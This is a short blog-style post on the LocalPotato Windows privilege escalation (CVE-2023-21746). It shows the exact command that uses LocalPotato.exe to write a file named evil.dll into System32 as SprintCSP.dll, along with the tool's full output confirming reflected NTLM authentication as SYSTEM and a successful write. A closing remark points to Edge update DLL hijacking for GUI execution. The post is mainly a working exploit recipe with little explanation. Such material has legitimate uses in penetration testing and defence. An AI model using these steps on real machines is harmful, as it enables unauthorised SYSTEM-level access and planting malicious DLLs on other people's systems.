# LocalPotato

Monday, March 20, 2023 by manesec.

## Note

It may need to enable **share files with the Home Group Sharing feature**.

```cmd
C:\Users\Mane\Downloads\LocalPotato>LocalPotato.exe -i evil.dll -o \Windows\System32\SprintCSP.dll


         LocalPotato (aka CVE-2023-21746)
         by splinter_code & decoder_it

[*] Objref Moniker Display Name = objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGAQAAAAAAAACMvgT9F4qM/hFmqmVSIbmqArAAAJAfxAU6GAYMt+HvBjgAIgAHAEQARQBTAEsAVABPAFAALQAxAE4AVgBKAEoAQQBNAAAABwAxADkAMgAuADEANgA4AC4AMQA5AC4AMQA2ADAAAAAAAAkA//8AAB4A//8AABAA//8AAAoA//8AABYA//8AAB8A//8AAA4A//8AAAAA:
[*] Calling CoGetInstanceFromIStorage with CLSID:{854A20FB-2D44-457D-992F-EF13785D2B51}
[*] Marshalling the IStorage object... IStorageTrigger written: 100 bytes
[*] Received DCOM NTLM type 1 authentication from the privileged client
[*] Connected to the SMB server with ip 127.0.0.1 and port 445
[+] SMB Client Auth Context swapped with SYSTEM
[+] RPC Server Auth Context swapped with the Current User
[*] Received DCOM NTLM type 3 authentication from the privileged client
[+] SMB reflected DCOM authentication succeeded!
[+] SMB Connect Tree: \\127.0.0.1\c$  success
[+] SMB Create Request File: Windows\System32\SprintCSP.dll success
[+] SMB Write Request file: Windows\System32\SprintCSP.dll success
[+] SMB Close File success
[+] SMB Tree Disconnect success

```

GUI can use edge update hijack dll.

Ref: https://github.com/decoder-it/LocalPotato